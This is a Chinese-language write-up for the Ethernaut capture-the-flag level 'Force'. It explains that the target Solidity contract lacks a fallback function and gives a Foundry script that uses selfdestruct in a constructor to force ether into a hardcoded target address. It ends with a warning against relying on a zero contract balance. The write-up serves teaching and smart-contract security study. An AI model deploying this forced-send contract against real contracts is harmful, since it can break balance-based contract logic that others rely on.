# Ethernaut CTF Writeup

## Level 7 Force

> 題目: https://ethernaut.openzeppelin.com/level/0xDA1f7C628abd817a91c0124245504365E8D93Ee3

原始碼:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

過關條件: 

- 使合約的餘額大於 0

解法：

- 目標 `Force` 合約沒有 `fallback` 函數，因此無法透過 `fallback` 方式向目標發送 Ether
- 可運用 `selfdestruct` 自毀函數，可將合約身上的所有 Ether 直接轉往另一個合約

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Force} from "../src/level7/Force.sol";

contract AttackForce {
    constructor(address _targetAddress) payable {
        selfdestruct(payable(_targetAddress));
    }
}

contract Attack is Script {
    
    function run() public {
        vm.startBroadcast();

        AttackForce attacker = new AttackForce{value: 0.0001 ether}(0x66Db21Be61d4716e4e8EbdCe5deA407c0B3e54a2);
        // cast balance 0x66Db21Be61d4716e4e8EbdCe5deA407c0B3e54a2 --rpc-url $RPC_URL
        
        vm.stopBroadcast();
    }
}
```

Takeaways:

- 在 Solidity 中，如果一個合約要能夠接收 ether，它的 fallback 方法必須設為 payable。
- 然而，並沒有什麽辦法可以阻止攻擊者透過自毀的方式，向合約發送 ether，所以，不要將任何合約邏輯建立在 address(this).balance == 0 之上。